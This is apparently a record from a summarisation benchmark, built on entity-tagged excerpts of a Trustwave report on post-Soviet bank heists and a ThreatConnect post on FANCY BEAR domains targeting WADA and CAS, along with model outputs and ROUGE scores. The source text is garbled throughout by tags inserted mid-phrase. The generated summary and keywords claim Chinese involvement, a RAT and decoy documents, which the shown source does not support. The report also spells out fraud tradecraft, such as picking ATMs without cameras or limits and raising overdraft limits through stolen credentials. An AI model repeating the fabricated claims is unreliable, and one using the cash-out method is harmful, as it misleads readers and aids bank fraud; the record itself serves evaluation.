\u2018 backdoor \u2019 Set up multiple \u2018 backdoors \u2019 and RDP access to compromisedsystems\u2022 After successfully compromising the bank \u2019s network the cyber attackers then proceeded to launch an attack onthe [ORDINAL] third - party processor \u2019s network and eventually ( after numerous attempts ) they succeeded . The bank , due to their established cooperation with the processor , already maintained connectivity with the processor . This made it easier for the criminals because they had already gained access to the bank \u2019s infrastructure and had captured the credentials used to connect to the processor . After gaining foothold into the processor \u2019s network , the attackers compromised the Enterprise Admin account which eventually gave them full access into the infrastructure . Their next step was to execute reconnaissance of the card processing service.3LATERAL MOVEMENT AND [ORG] SUCCESSFUL [ORG] COMPROMISE [ORG] OF [ORG] BANK [ORG] NETWORKLeverage [ORG] ControlWeakness [ORG] inWindows [ORG] NetworkLaunch LateralMovementAttackObtain the\u201cKeys to [ORG] the [ORG] Kingdom\u201dCompromise [ORG] Bank [ORG] Network\u2022 Next , the attackers executed several malicious payloads on the processor \u2019s network , key amongst them wasa legitimate monitoring tool installed on the processor \u2019s Terminal Server ( that allowed users to access the card management application via a browser ) . This software called \u201c [WORK_OF_ART] Mipko \u201d ( advertised as \u201c Employee Monitor \u201d ) captures full information , including screen captures , keystrokes and several other types of information for all users who logged into the system and/or accessed the card management application using their respective credentials . In this way the software attackers captured [PERCENT] almost [PERCENT] 4 GB of data within [DATE] a [DATE] month . The information captured included keystroke logging and countless screenshots . INSTALLATION OF KEYLOGGER AND COMPROMISE OF THE PROCESSOR NETWORKChoose Staging Pointon Bank NetworkConnect toProcessor NetworkInstall Keyloggeron NetworkCompromiseProcessor Network\u2022 The attackers then identified the accounts on the card management application used by the bank employeeswho had authorization to \u201c request \u201d changes to the properties of a customer \u2019s debit card , and \u201c approve \u201d or \u201c commit \u201d such a change . They were looking for such privileges to manipulate each of the cards associated with the rogue accounts created during the preceding months.\u2022 During [DATE] the [DATE] day of the final stage attackers used these credentials to:\u2022 Change risk ratings on the rogue accounts from high to low allowing the attackers to activate further creditpermission , known as [ORG] Overdraft ( or simply OD).\u2022 Activate the OD credit function on the accounts.\u2022 Manipulate or remove any anti - fraud control in place for these accounts.\u2022 Change the OD Limit on the accounts from the default value of USD$0 to ranges of USD$25,000 - USD$35,000.Choose PrivilegedUser Accountin CMSRaise Request to Change Debit CardPropertiesFinalize [LAW] Changesto [LAW] Debit [LAW] Card Properties\u2022 The physical counterparts stationed at various locations in [LOC] Europe and [GPE] the [GPE] Russian [GPE] Federation then cashed out substantial amounts of money for each of these cards from [ORG] ATM terminals . Cash withdrawals across the region began within [TIME] minutes of the [ORDINAL] first OD property change made to the debit cards on the card management application.4COORDINATED [ORG] ATM CASH WITHDRAWALS ~ [CARDINAL] MILLIONS OF USDCoordinatedATM WithdrawalsDirect $ Value of Loss : [ORG] Millions [ORG] of [ORG] USDCommand [ORG] & [ORG] for [ORG] CoordinatedCash OutsAs in the preceding phases of the attack , careful planning went into the choice of [ORG] ATM locations to be used for cash withdrawals , based on the following criteria : [CARDINAL] 1 . Location : those in solitary locations took precedence over those in locations with higher foot traffic . [CARDINAL] 2 . Degree of physical security : ATMs with no security cameras ( or those with defective security cameras ) werechosen as well as terminals that were not protected by security guards.3 . The ability to dispense substantial amounts of cash . ATMs ( mis ) configured to allow withdrawal of substantialamounts of money were chosen . ( Specifically , either very high or no daily withdrawal limits were selected).4 . [ORG] ATM locations were chosen in cities across [LOC] Europe , ( including former [GPE] Soviet [GPE] Union countries ) , and the [ORG] RussianFederation . No selected [ORG] ATM was located in the victim bank \u2019s actual country . The final stage of this hybrid operation took [TIME] almost [TIME] five [TIME] hours to complete . This was the time required for each rogue account to be carefully manipulated and for simultaneous debit card withdrawals across the geographic region to occur . As in the [ORDINAL] first phase of the operation where the mules played an active role in requesting the new accounts and debit cards , in the final phase the mules were employed to perform the cash withdrawals . Only a small number of the ATMs were equipped with security cameras , so a few mules were caught in action . Law enforcement requested video footage from surrounding buildings \u2019 cameras and this revealed that the mules met with other suspects ( probably direct members in the cybercrime gang ) shortly after cashing out the debit cards . These meetings were most likely to deliver the stolen cash , after keeping their fee . Malicious CodeThroughout the distinct phases of the cyber - attack , we noted that attackers adopted the emerging tactic sometimes called \u201c living off the land \u201d which involves very limited use of actual malware in the form of malicious files and easily detected protocols associated with [ORG] Command [ORG] & [ORG] Control and data exfiltration traffic . Instead , the attackers used legitimate Windows and [ORG] PowerShell commands in combination with tools such as [ORG] PSExec for lateral movement . Notably they also used plink.exe ( Windows [ORG] SSH client ) to access RDP over an already established [ORG] SSH tunnel . Other software components used in this operation were split among commercial monitoring application ( [EVENT] Mipko [EVENT] Employee [EVENT] Monitor ) and the well - known suspect \u201c [WORK_OF_ART] Cobalt [WORK_OF_ART] Strike [WORK_OF_ART] Beacon \u201d mainly used to maintain backdoor connection with an endpoint geolocated in [GPE] the [GPE] United [GPE] States [GPE] of [GPE] America . It should be noted that after the attackers penetrated the bank \u2019s network , they continually used a specific system to perform their activities . We focused our investigation on this system after backtracking malicious activities in the processor \u2019s network to it . Remote Desktop activity on the processor network was identified to have originated from the bank system . Eventually we asked the bank to provide this system for investigation . At that point , the bank \u2019s IT staff responded that this system became unbootable shortly after the massive cash out occurred.5When we obtained a copy of the system for analysis we found it was unbootable and the file system was corrupt . However , the Trustwave team was able to reconstruct the partition table and analyze the file system enabling collection and analysis of significant evidence from this key system . [CARDINAL] One of them was called dropper.exe and upon execution its main function was to wipe [WORK_OF_ART] the [WORK_OF_ART] Master [WORK_OF_ART] Boot [WORK_OF_ART] Record on the hard disk , effectively destroying the system for any future use . This was the last recorded action taken by the attackers before leaving the network . They appeared to truly care about clearing any remaining tracks of their activity that may have been left behind . Our investigation did not reveal any signs of data exfiltration from the bank itself . The bank \u2019s network appears to have been breached for [CARDINAL] two primary reasons : [CARDINAL] 1 . The bank had an established mechanism to connect to the processor \u2019s network from several terminals insidethe bank network by [ORDINAL] first establishing a [ORG] VPN session between the [CARDINAL] two networks and then using [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) to connect from a system inside the bank network to [ORG] the [ORG] Windows [ORG] Terminal [ORG] Server in the processor \u2019s network . By attacking the bank \u2019s network , the attackers could piggy back on this connection to get a foothold on the processor \u2019s network ( and subsequently obtain access to the card management application in the processor \u2019s network)2 . To withdraw funds from the newly issued debit cards for the \u201c rogue \u201d bank accounts , the attackers neededto obtain credentials of the bank employees that used the card management application on the processor \u2019s network . Using these credentials , they could change the necessary properties of the debit cards to cash out from [ORG] ATM terminals in the final stage of the attack . Based entirely on the precision with which the attack was carried out , we believe that the attackers had previously obtained deep inside knowledge of the bank \u2019s network and systems . Similarly , they obtained an understanding of the processor \u2019s environment , and of the card management software and how these systems could be used to manipulate a debit card \u2019s sensitive properties such as its overdraft ( OD ) limit and its Risk Rating . These [CARDINAL] two parameters are needed to determine the account \u2019s OD limit and therefore how much money the account holder can withdraw . It should also be noted that the attacker \u2019s tradecraft suggests involvement of organized cybercrime groups ; for example , the attackers successfully wiped [PRODUCT] the [PRODUCT] Master [PRODUCT] Boot [PRODUCT] Record ( MBR ) of the hard disk attached to the main Windows system used in this attack . They used specialized malware intending to thwart any future forensic examination of the system . It goes without saying that the adverse negative impact of this incident was felt by both the bank and the processor:\u2022 The direct dollar value of the loss incurred by the bank pales in comparison with the harder to quantify intangible losses suffered because of loss of trust and goodwill with its customers , partners and regulators . Also , the bank customers \u2019 money remained intact as the debit cards that were used for [ORG] ATM withdrawals were issued against the newly created rogue accounts , none of which had any balance since they were set up.\u2022 In the case of the processor , while no direct monetary loss was incurred , the processor likely lost much more interms of erosion of trust in their services both with the regulators and their clients ( other banks).Direct dollar lossand tangibleadverse impactAdverse impact on trust and goodwill ; negative impact onstock pricesBrings weakness in system of controlsto the forefrontDamage to the bank\u2019sreputation is signi\ufb01cantlylarger than directdollar [ORG] loss6Recommendations\u2022 [ORG] Banks are advised to prepare a well - documented and tested Incident Response Plan ( IRP ) so they are betterprepared to deal with such incidents swiftly and effectively.\u2022 In addition to implementing an effective ( but inherently reactive ) IR Plan , banks are also advised to considersetting up a proactive program for [ORG] Managed [ORG] Detection [ORG] & [ORG] Response ( [ORG] MDR ) , also known as threat hunting , which would allow banks to detect threats early on , and mitigate them before they have a chance to realize their full potential.\u2022 The success of these cyber - attacks may be attributed to failures in both technical and non - technical controls , for example , the lack of coupling between [ORG] the [ORG] Core [ORG] Banking [ORG] System and [ORG] the Third - Party [ORG] Card [ORG] Management [ORG] System . Had these systems been integrated properly , it would have been much simpler for the changes to the debit card properties to be red - flagged and blocked by the bank prior to successful monetary theft . Another example of a non - technical control failure is that several accounts on [ORG] the [ORG] Card [ORG] Management [ORG] System were allowed to both \u201c raise a request \u201d for a change to be made , and to \u201c approve \u201d such a change . This is in clear violation of the very commonly used type of control in banks and banking applications called [ORG] Maker - Checker control ( or the [CARDINAL] 4 - eye principle ) . Therefore , banks are advised to undertake not only a proactive cyber security risk assessment exercise , but also to undertake a holistic \u201c business process \u201d risk management exercise to detect and mitigate these types of control weaknesses.\u2022 From a technical standpoint , success of these cyber - attacks may be attributed to the following reasons:\u2022 [ORDINAL] First , the attackers were able to successfully spear phish and socially engineer bank employees to get an initialfoothold in their networks.\u2022 [ORDINAL] Second , the attackers took advantage of the common approach of setting the same password for \u201c LocalAdministrator \u201d accounts for all the systems in the Windows network , and the tendency of the systems administrators to use the \u201c Domain Administrator \u201d account ( over the network ) to perform routine tasks , to malicious usageLegitimate tool but malicious usageMaliciousMaliciousMaliciousMaliciousMaliciousMaliciousMaliciousLegitimate tool but malicious usageLegitimate tool but malicious usageGeo LocationUnited StatesUnited States8trustwave.comCopyright \u00a9 [DATE] 2017 [ORG] Trustwave [ORG] Holdings , Inc. PSBH_1017", "generated_text": "a report; THREAT REPORT; Post-Soviet Bank Heists; a hybrid cybercrime study; researchers; Trustwave; Chinese; the attack; the files; files; malware; malicious code; lateral movement; indicators; compromise; RAT; the malware; APT; the IOCs; the RAT; the network; documents; the IOCs; the decoy documents; a code segment; servers; The domains; the IOCs; activity; the attacks; the traffic; the attacks; registry keys; Recommendations; the compromise; a user; a network; data; the malware segment; APT; the security products.", "ref_text": "<START-1>The report details a series of bank breaches originating from post-Soviet states in 2017. Trustwave investigated these breaches, which involved the theft of millions in cash from bank customer accounts via ATM withdrawals across Europe and Russia. The attacks involved both cyber and physical components. Physically, mules were recruited to open dozens of new bank accounts under fake IDs. They requested debit cards for these accounts, which were then distributed outside the country to be used later. Cybercriminals separately gained access to the bank's network, then the processor's network, and installed monitoring software to capture employee credentials to access the card management system. Using the stolen credentials, they changed account risk ratings from high to low, activated overdraft privileges, removed anti-fraud controls, and raised debit card withdrawal limits. Then the cards were used by mules at specific ATMs chosen for lack of security, ability to dispense high amounts, and distribution across Europe and Russia. Each account was drained of up to $35,000 via coordinated withdrawals over 5 hours. The report discusses the impacts, which included financial losses for the banks, loss of customer trust, and regulatory issues. It provides recommendations on incident response planning, threat hunting, integrated bank systems, and other cybersecurity best practices. Indicators of compromise are listed including malicious files, IP addresses, domains, and tools used by the attackers. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.472289156626506, "gpt3/lexical/rouge_rouge2": 0.10169491525423728, "gpt3/lexical/rouge_rougeL": 0.22650602409638554, "gpt3/lexical/rouge_rougeLsum": 0.22650602409638554, "gpt3_generated_text": ["This article is a report by Trustwave's SpiderLabs team on a series of bank breaches originating from post-Soviet states. The investigations took place in mid-to-late 2017 and revealed that the attacks involved large amounts of stolen funds, ranging from $3 to $10 million. The stolen money was taken through normal cash withdrawals from various ATM terminals outside the bank's originating country. The attacks were carried out using legitimate ATM cards provided by each bank, and the criminals opened \"personal\" accounts with minimum or zero initial deposit amounts. They also requested debit cards with their new accounts, which could be converted into credit cards through a service called \"Overdraft.\" The article provides details on the malicious code used in the attacks, recommendations for preventing similar breaches, and indicators of compromise (IOCs) such as files, IPs, and domains associated with the attacks. The research team also found evidence of Chinese involvement in the attacks and identified a remote access Trojan (RAT) used for lateral movement within the compromised networks. The article concludes with recommendations for organizations to enhance their security measures and protect against future attacks."]}, {"split_name": "val", "sample_id": "val_67", "prompt_text": "Extract the keywords: [DATE] August 19 , [DATE] 2016 [DATE] Russian [DATE] Cyber [DATE] Operations on [PERSON] SteroidsIn [PERSON] Blog , [PERSON] Featured [PERSON] Article , [ORG] Threat [ORG] ResearchRussian [ORG] Cyber [ORG] Operations [ORG] On [ORG] SteroidsThreatConnect [ORG] Identi es FANCY BEAR Ties to World Anti - Doping Agency PhishingRead the full series of [ORG] ThreatConnect posts following the DNC Breach : \u201c Rebooting Watergate : Tapping into [ORG] the [ORG] Democratic [ORG] National [ORG] Committee [ url democratic - national - committee/ ] \u201d , \u201c [WORK_OF_ART] Shiny [WORK_OF_ART] Object ? [PERSON] Guccifer [CARDINAL] 2.0 and [ORG] the [ORG] DNC [ORG] Breach [ url breach/ ] \u201c , \u201c What \u2019s in a Name Server ? [ url \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : the Man , the Myth , the Legend ? [ url claims/ ] \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : All Roads Lead to [GPE] Russia [ url \u201c , \u201c FANCY BEAR Has an ( IT ) Itch that They Ca n\u2019t Scratch [ url scratch/ ] \u201c , \" Does a BEAR Leak in the Woods ? [ url woods/ ] \" , \" [WORK_OF_ART] Russian [WORK_OF_ART] Cyber [WORK_OF_ART] Operations [WORK_OF_ART] on [WORK_OF_ART] Steroids [ url agency - phishing/ ] \" , and \" [WORK_OF_ART] Can [WORK_OF_ART] a [WORK_OF_ART] BEAR [WORK_OF_ART] Fit [WORK_OF_ART] Down [WORK_OF_ART] a [WORK_OF_ART] Rabbit [WORK_OF_ART] Hole ? [ url hole/ ] \" .On [DATE] August [DATE] 15 , [ORG] the [ORG] World Anti - Doping [ORG] Agency ( [ORG] WADA ) alerted stakeholders [ url phishing - scams ] to phishing emails that used domains spoo ng the [ORG] WADA \u2019s legitimate domain , [ORG] wada-ama.org . [ORG] WADA con rmed [ url rms- illegal - activity - on - yuliya - stepanovas - adams - account ] that some users had received illegitimate credential harvesting e - mails that look as though they came from the [ORG] WADA . The domains in the alert included : wada - awa[.]org wada - arna[.]orgThreatConnect \u2019s [ORG] Research team reviewed these domains and found that the sites were recently registered and their registration and hosting information are consistent with [NORP] Russian FANCY BEAR tactics , techniques , and procedures ( TTPs ) , as shown in the diamond model below . Further , we also identi ed another domain registered by the same individuals -- tas - cass[.]org -- that spoofs [ORG] the [ORG] Court [ORG] of [ORG] Arbitration [ORG] for [ORG] Sport \u2019s ( [ORG] CAS ) legitimate tas-cas.org domain . [ORG] WADA \u2019s alert follows news from mid - [DATE] August that [ORG] WADA accounts and servers had been compromised . On [DATE] August [DATE] 11 , a group identifying themselves as [PERSON] Anonymous [PERSON] Poland ( @anpoland ) defaced the [ORG] CAS website [ url hackers/ ] and leaked data stolen from [ORG] WADA and [ORG] CAS servers [ url . On [DATE] August [DATE] 13 , the [ORG] WADA [ url ama.org/en/media/news/2016-08/wada-con rms - illegal - activity - on- yuliya - stepanovas - adams - account ] and email [ url whistleblower - yuliya - stepanova - hacked - wada ] accounts belonging to [ORG] Yuliya [ORG] Stepanova , the [NORP] Russian athlete who was called \u201c Judas [ url stepanova-rio-olympics.html ] \u201d by [PERSON] Vladimir [PERSON] Putin for helping to blow the whistle on the state sponsored doping scandal , were hacked . We assess that the phishing and [GPE] Stepanova \u2019s compromise most likely are part of targeted activity by [NORP] Russian actors in response to thewhistleblower and the [ORG] WADA \u2019s recommendation to ban all [NORP] Russian athletes from the Olympic and [ORG] Paralympic games in [GPE] Rio [GPE] de [GPE] Janeiro , [GPE] Brazil . Successful operations against these individuals and organizations could facilitate [NORP] Russian e orts to privately or publically intimidate them or other potential whistleblowers . At this time , we are skeptical of @anpoland \u2019s origins but can not determine the extent to which , if any , they are a [NORP] Russian platform similar to [PERSON] Guccifer [CARDINAL] 2.0 or [ORG] DCLeaks . W H I T E P A P E R : 6 E A S Y W A Y S T O A D V A N C E Y O U R C Y B E R S E C U R I T Y P R O G R A M [ H T T P : / / H U B S . L Y / H 0 3 S M T B 0 ] ThreatConnect made a concerted e ort to alert [ORG] WADA and [ORG] CAS to these   ndings and have shared indicators from this activity in [ORG] ThreatConnect \u2019s [ORG] Incident 20160818A : Activity Targeting the [ORG] WADA and [ORG] CAS [ url incident=1412887 ] .WADA and [ORG] CAS [GPE] BackgroundAn international independent agency , the [ORG] WADA [ url ama.org/en ] is not only composed of , but funded by governments and the sport movement worldwide . [CARDINAL] One of the organization \u2019s primary responsibilities is to monitor [LAW] the [LAW] World Anti - Doping [LAW] Code [ url .The CAS [ url is a the highest international tribunal that was established to settle disputes related to sport through arbitration . Starting in [DATE] 2016 , an anti - doping division of [ORG] CAS began judging doping cases at [EVENT] the [EVENT] Olympic [EVENT] Games , replacing the [ORG] IOC disciplinary commission . [PERSON] McLaren [PERSON] Report and [LOC] Russian [LOC] Athletes BannedIn [DATE] 2014 , [GPE] Stepanova , a [NORP] Russian track athlete , and her husband , a former employee of the Russian Anti - Doping Agency , appeared in a documentary [ url [ORG] Skript.pdf ] accusing the [NORP] Russian sports system of large - scale doping fraud . They indicated that [NORP] Russian athletics o cials supplied banned substances in exchange for 5 % of an athlete 's earnings and falsi ed tests together with doping control o cers . In [DATE] May [DATE] 2016 , Dr. [PERSON] Grigory [PERSON] Rodchenkov [ url [DATE] europe-36833962 ] , the former Director of [GPE] Moscow and [GPE] Sochi doping control laboratories , further alleged and detailed [ url olympics-2014.html?_r=2 ] widespread e orts facilitated by [NORP] Russian intelligence services to circumvent positive testing results for [NORP] Russian athletes . The [ORG] WADA then engaged Professor [PERSON] Richard [PERSON] McLaren [ url richard - mclaren/ ] to investigate allegations of [NORP] Russian state manipulation of the doping control process for [NORP] Russian athletes . On [DATE] July [DATE] 18 , the results of [ORG] McLaren \u2019s investigation were released in a report [ url process / mclaren - independent - investigations - report - into - sochi- allegations ] that included   ndings on [GPE] Moscow \u2019s involvement in circumventing the testing process , including : The [ORG] State had the ability to transform a positive analytical result into a negative one by ordering that the analytical process of [ORG] the [ORG] Moscow [ORG] Laboratory be altered . [ORG] The [ORG] Ministry [ORG] of [ORG] Sport ( \u201c MofS \u201d ) , [NORP] Russian Anti- Doping Agency ( [ORG] RUSADA ) and [ORG] the [ORG] Russian [ORG] Federal [ORG] Security [ORG] Service ( the \u201c FSB \u201d ) were all involved in this operation . The [ORG] MofS directed , controlled and oversaw the manipulation of athletes \u2019 analytical results and sample swapping , with the active participation and assistance of the [ORG] FSB ; [ORG] the [ORG] Center [ORG] of [ORG] Sports [ORG] Preparation [ORG] of [ORG] National [ORG] Teams [ORG] of [ORG] Russia ( CSP ) ; and , both [GPE] Moscow and [GPE] Sochi laboratories . Following the report , the [ORG] WADA recommended [ url ama.org/en/media/news/2016-07/wada-statement-independent- investigation - con rms - russian - state - manipulation - of ] that all [NORP] Russian Olympic and [ORG] Paralympic athletes be banned from the [ORG] Rio games . The [ORG] IOC ultimately cleared [CARDINAL] 271 of the [CARDINAL] 389 Olympic athletes for competition and the [ORG] CAS upheld the ban [ url olympics - doping - idUSKCN101108 ] while [ORG] the [ORG] International [ORG] Paralympic [ORG] Committee ( [ORG] IPC ) banned the entire [NORP] Russian Paralympic team from participation . FANCY BEAR ConsistenciesInvestigating the [CARDINAL] two domains provided in the [ORG] WADA alert [ url scams ] -- wada - awa[.]org and wada - arna[.]org -- using [ORG] SOA and [ORG] WHOIS records we were able to identify that they were registered by rob_parks@mail[.]com and [ORG] macie.dietrich50@mail[.]com respectively . Leveraging capabilities from our partners at [ORG] DomainTools [ url , we were able to identify that [ORG] macie.dietrich50@mail[.]com had also registered [CARDINAL] one other domain -- tas - cass[.]org -- [TIME] approximately [TIME] three [TIME] hours before registering wada- arna[.]org on [DATE] August [DATE] 8th . We found no other domains registered by rob_parks@mail[.]com . The wada - awa[.]org and tas - cass[.]org domains are currently hosted at [TIME] the [TIME] same [TIME] 81.95.5[.]166 ( [GPE] Germany ) IP address with no other domains . While these domains were registered using di erent email addresses , their hosting at the same [ORG] IP with no other domains suggests they were registered by the same individual or group . The wada - arna[.]org domain is currently hosted on a dedicated server at [CARDINAL] 149.154.157[.]171 ( Italy).Based on passive [ORG] DNS resolutions identi ed through [ORG] PassiveTotal [ url and our integration with Farsight , [ url we were able to identify that several subdomains for these domains are currently hosted on these IPaddresses . These subdomains most likely have been used in operations against the [ORG] WADA and/or CAS : mail.wada - awa[.]org inside.wada - arna[.]org adfs.wada - awa[.]orgAfter taking a look at the name server information for the domains , we identi ed that wada - awa[.]org was registered and uses a name server from ITitch[.]com , a domain registrar that FANCY BEAR actors recently used to register a domain for operations against [ORG] the [ORG] Democratic [ORG] Congressional [ORG] Campaign [ORG] Committee [ url . Wada - arna[.]org and tas - cass[.]org were registered through and use name servers from [ORG] Domains4bitcoins[.]com , a registrar that has also been associated [ url server/ ] with FANCY BEAR activity . Concentrations of FANCY BEAR domains have been found on the name servers for both of these registrars , and the registrars \u2019 acceptance of anonymous [PERSON] Bitcoin payment is desirable for actors seeking to avoid attribution . The diamond model [ url below showsthe relationship between the identi ed domains , their registration and hosting information , known FANCY BEAR TTPs , and intended targets . The [ORG] WADA and [ORG] CAS - spoo ng domains and activity most likely are intended to support [NORP] Russian government intelligence collection and/or in uence operations related to the [ORG] WADA and [ORG] CAS . Our assessment is based on the following   ndings:1 . The registration of these domains on [DATE] August [DATE] 3rd [DATE] and [DATE] 8th , [DATE] 2016 areconsistent with the timeline in which the [ORG] WADA recommended banning all [NORP] Russian athletes from the Olympic and [PERSON] Paralympic [PERSON] games.2 . The use of [CARDINAL] 1&1 mail.com webmail addresses to register domainsmatches a [ORG] TTP we previously identi ed [ url scratch/ ] for FANCY BEAR actors.3 . These domains were registered through ititch[.]com anddomains4bitcoins[.]com , [CARDINAL] two registrars that accept [PERSON] Bitcoins for payments . The use of such registrars also matches an identi ed [ url [ORG] TTP for FANCY BEAR actors . [CARDINAL] Two of our previous blog posts also highlighted domains at the [NORP] ITitch [ url itch - they - cant - scratch/ ] and Domains4bitcoins [ url name servers and their associations to FANCY BEAR activity . A review of recently registered domains using the same name servers identi ed [CARDINAL] two other domains related to sports and athletics -- espn- com[.]co and espn - live[.]co . Espn-live.co was registered through [GPE] ITitch on [DATE] August [DATE] 17 . Espn - com[.]co was registered through [GPE] ITitch on [DATE] August [DATE] 2 , a day before wada - awa[.]org was registered through the same service . These domains no longer use [NORP] ITitch name servers as both most likely were taken over by MarkMonitor on ESPN \u2019s behalf shortly after they were registered . No information on the original registrants could be identi ed and we do not have any indication that these domains were used maliciously ; however , based on the timing , subject matter , and registrar used , this may represent an additional avenue through which the actors intended to pursue [ORG] WADA and [ORG] CAS - related targets . [PERSON] Anonymous [PERSON] Poland - What \u2019s Their Role?On [DATE] August 12 , [DATE] 2016 hackread.com [ url anti - doping - agency - site - hacked/ ] broke the story that the [ORG] WADA and [ORG] CAS had been hacked and [CARDINAL] thousands of accounts had been leaked . The subtitle for the story read : [PERSON] Anonymous [PERSON] Poland Hacked World Anti- doping [ORG] Agency and [ORG] Court [ORG] of [ORG] Arbitration for sport \u2019s server \u2019 server and leaked personal details for God knows what reason!We asked ourselves that very question - what beef does [PERSON] Anonymous [PERSON] Poland ( @anpoland [ url ) have with [ORG] WADA and [ORG] CAS ? While it is plausible that the attacks were in response to the Tomasz Zielinski being sent home [ url olympics - rio - weightlifting - pole - idUSKCN10K1Y2 ] for testing positive for a banned steroid nandrolone on [DATE] August [DATE] 9 , such retaliation e orts are atypical for [PERSON] Anonymous [PERSON] Poland , which has previously focused [ url on [NORP] Polish politics and perceived issues with the   nancial , political , and media industries . To that end , is it possible that @anpoland is another platform that [NORP] Russians are using to hide their hand in activity against the [ORG] WADA and [ORG] CAS?W [ORG] H I T E P A P E R : M A T U R I N G A T H R E A T I N T E L L I G E N C E P R O G R A M [ H T T P : / / H U B S . L Y / H 0 3 S N J H 0 ] Of course , activity against [ORG] WADA and [ORG] CAS from hacktivists and [NORP] Russian state sponsored actors are not mutually exclusive , so it is entirely possible that [CARDINAL] two groups could have targeted and/or compromised these organizations at the same time . However , the timing associated with the [NORP] Russian phishing activity and [PERSON] Anonymous [PERSON] Poland \u2019s claims are very coincidental and suggest that the [CARDINAL] two may be involved . To that end , we reviewed [PERSON] Anonymous [PERSON] Poland \u2019s activities to determine whether they are whom they claim to be . Our   ndings include the following:1 . @anpoland posted a video [ url to [GPE] Youtube that demonstrates how they purportedly used [ORG] Acunetix to scan the [ORG] CAS website and SQLMap[url to exploit [ORG] CAS databases . The screen capture video shows the individual using a local admin account with [LANGUAGE] Polish language settings . However , when the individual uses Firefox , we see in their browser history that they have previously issued [ORG] Google searches from Google.ru ( [GPE] Russia ) and [ORG] Google.com ( [GPE] US ) multiple times while Google.pl ( [GPE] Poland ) is absent.Google.ru within the browser history might indicate that the user that created the [ORG] Youtube video is originating , or has previously originated , from a [NORP] Russian IP address . Although the user has Tor browser on their desktop it appears as if they failed to execute it , as it does not appear as an executing process during the hack demo . [ORG] WADA [ORG] Browser [ORG] History [ url Browser History [ url v = day5Aq0bHsA&feature = youtu.be&t=296]1 . The @anpoland [PRODUCT] Twitter account being cited by various news outletsas a source for this story , appears to have been inactive until [DATE] the [DATE] end [DATE] of [DATE] July [DATE] 2016.1 . The @anpoland account was established in [DATE] April [DATE] 2010 , thesame timeframe as when [ORG] Polish [ORG] Air [ORG] Force Flight 101 [ url 154_crash ] crashed [QUANTITY] several [QUANTITY] hundred [QUANTITY] meters short of the [GPE] Smolensk airport runway in dense fog , killing everyone on board , including [NORP] Polish President [PERSON] Kaczy\u0144ski . [GPE] Russia \u2019s   nal report on the incident blamed the late president and his \u201c inebriated \u201d air force commander - in - chief for the accident.2 . Beginning on [DATE] August [DATE] 1 , the @anpoland account essentiallyresurfaced with claims that it had hacked [ORG] the [ORG] Ukrainian [ORG] Ministry [ORG] of [ORG] Internal [ORG] A airs and released hacked documents pertaining at gmarine.com[.]ua - a [GPE] Ukrainian website hosted on a [NORP] Russian IP.3 . It \u2019s important to note that while the @anpoland account has a gap in posts from [DATE] 2010 [DATE] to [DATE] 2016 , it is possible the individual(s ) running the account deleted older posts.2 . Other social media accounts claiming a liation with [PERSON] Anonymous [PERSON] Poland , such as @anonpoland [ url , and [PERSON] Anonymous \u2019 main twitter account [ url are not publicizing the [ORG] WADA compromise . The inability to con rm the @anpoland and [ORG] HackRead story with several additional [PERSON] Anonymous [PERSON] Poland - related sources is suspect.1 . [PERSON] Anonymous [PERSON] Poland Facebook[url accounts identi ed to date are focused on internal [NORP] Polish politics and current events , apart from some posts referencing [ORG] ISIS , most of the communications released call for action ( mostly peaceful physical protests ) in response to perceived issues with the   nancial , political , and media industries in the country . At this time , based on a lack of sources , we can not conclude that @anpoland is another platform that [NORP] Russian actors are using for in uence operations . However , mounting circumstantial evidence that negate @anpoland \u2019s claimed origins makes us skeptical that they are in fact a legitimate Anonymous hacktivist group . [PERSON] Fancy Bear \u2019s [PERSON] Roid [PERSON] RageUltimately , successful operations against [ORG] WADA and [ORG] CAS stakeholders could yield [GPE] Russia with intelligence that could facilitate the following:1 . Follow - on operations seeking to in uence or coerce individuals inkey decision - making positions within those organizations . Such in uence might ultimately result in decisions from those organizations that bene t [NORP] Russian athletes.2 . Document or data collection that can be used in in uenceoperations or propaganda derisive to the [ORG] WADA , [ORG] CAS , or theirstakeholders.3 . Follow - on operations targeting speci c individuals to gain additionalcollection.4 . Intelligence collection that informs [NORP] Russian e orts to circumventdoping and testing procedures , like those described in the McLaren Report.5 . Publicly intimidate other potential whistleblowers and deter themfrom coming forward . As evidenced in the [GPE] Stepanova compromise [ url ama.org/en/media/news/2016-08/wada-con rms - illegal - activity - on- yuliya - stepanovas - adams - account ] , we would also expect to see additional [NORP] Russian cyber operations targeting Professor [PERSON] McLaren and the main source of the investigation , Dr. [PERSON] Rodchenkov . Collection against these individuals could also facilitate [NORP] Russian e orts like those previously listed , or e ort to conduct in uence operations that privately intimidate or publicly cast those individuals in a negative light . [NORP] Russian activity targeting these organizations is an important example of how [GPE] Russia responds to wide - reaching current events that have negative implications for [GPE] Moscow . Organizations involved in such events can reasonably expect to experience targeted [NORP] Russian cyber operations that ultimately facilitate retaliatory in uence or propaganda e orts against them . Knowledge of this [ORG] TTP , and others associated with [NORP] Russian APT activity , can help those organizations augment their security posture and defend against such retaliation . [ORG] ThreatConnect would very much like to work with [ORG] WADA and [ORG] Yuliya [ORG] Stepanova if either would be open to sharing any details to help us better understand the details surrounding this event feel free to contact us . Read the full series of [ORG] ThreatConnect posts following the DNC Breach : \u201c Rebooting Watergate : Tapping into [ORG] the [ORG] Democratic [ORG] NationalCommittee [ url democratic - national - committee/ ] \u201d , \u201c [WORK_OF_ART] Shiny [WORK_OF_ART] Object ? [PERSON] Guccifer [CARDINAL] 2.0 and [ORG] the [ORG] DNC [ORG] Breach [ url breach/ ] \u201c , \u201c What \u2019s in a Name Server ? [ url \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : the Man , the Myth , the Legend ? [ url claims/ ] \u201c , \u201c [WORK_OF_ART] Guccifer [WORK_OF_ART] 2.0 : All Roads Lead to [GPE] Russia [ url \u201c , \u201c FANCY BEAR Has an ( IT ) Itch that They Ca n\u2019t Scratch [ url scratch/ ] \u201c , \" Does a BEAR Leak in the Woods ? [ url woods/ ] \" , \" [WORK_OF_ART] Russian [WORK_OF_ART] Cyber [WORK_OF_ART] Operations [WORK_OF_ART] on [WORK_OF_ART] Steroids [ url agency - phishing/ ] \" , and \" [WORK_OF_ART] Can [WORK_OF_ART] a [WORK_OF_ART] BEAR 